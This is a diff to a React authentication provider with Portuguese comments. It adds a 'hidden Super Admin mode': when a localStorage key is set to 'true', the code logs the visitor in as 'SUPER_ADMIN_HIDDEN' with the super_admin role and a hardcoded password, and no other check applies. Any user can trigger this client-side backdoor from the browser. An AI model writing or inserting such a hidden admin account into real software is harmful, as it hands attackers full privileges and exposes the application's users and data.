@@ -120,9 +120,26 @@ export const AuthProvider: React.FC<{ children: ReactNode }> = ({ children }) =>
       const externalUserStr = localStorage.getItem('directAuth_currentUser');
       const externalUser = externalUserStr ? JSON.parse(externalUserStr) : null;
       
+      // Verificar modo Super Admin escondido
+      const superAdminMode = localStorage.getItem('directAuth_superAdminMode') === 'true';
+      
       // 🔍 Verificando usuário externo
       
-      if (externalUser && (!currentUser || currentUser.name !== externalUser.name)) {
+      if (superAdminMode && (!isHiddenSuperAdmin || !currentUser || currentUser.name !== 'SUPER_ADMIN_HIDDEN')) {
+        // 🔄 Detectado modo Super Admin, ativando
+        const superAdminUser = {
+          id: 'super-admin',
+          name: 'SUPER_ADMIN_HIDDEN',
+          role: 'super_admin' as UserRole,
+          status: 'active' as UserStatus,
+          password: 'hidden_super_2026'
+        };
+        
+        setCurrentUser(superAdminUser);
+        setIsHiddenSuperAdmin(true);
+        authStorage.setUser(superAdminUser);
+        // ✅ Super Admin ativado
+      } else if (externalUser && (!currentUser || currentUser.name !== externalUser.name)) {
         // 🔄 Detectado usuário externo, atualizando AuthContext
         
         // Encontrar usuário correspondente na lista
